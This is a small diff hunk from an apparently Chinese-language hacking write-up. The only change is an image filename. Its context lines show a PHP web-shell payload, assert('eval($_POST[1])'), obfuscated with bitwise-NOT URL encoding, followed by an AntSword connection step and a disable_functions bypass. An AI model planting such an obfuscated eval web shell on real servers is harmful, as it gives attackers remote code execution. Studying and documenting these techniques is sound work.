@@ -47,7 +47,7 @@ assert('eval($_POST[1])') => (~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%
 
 蚁剑连接
 
-![](<../.gitbook/assets/image (14) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png>)
 
 再绕过disable\_functions
 
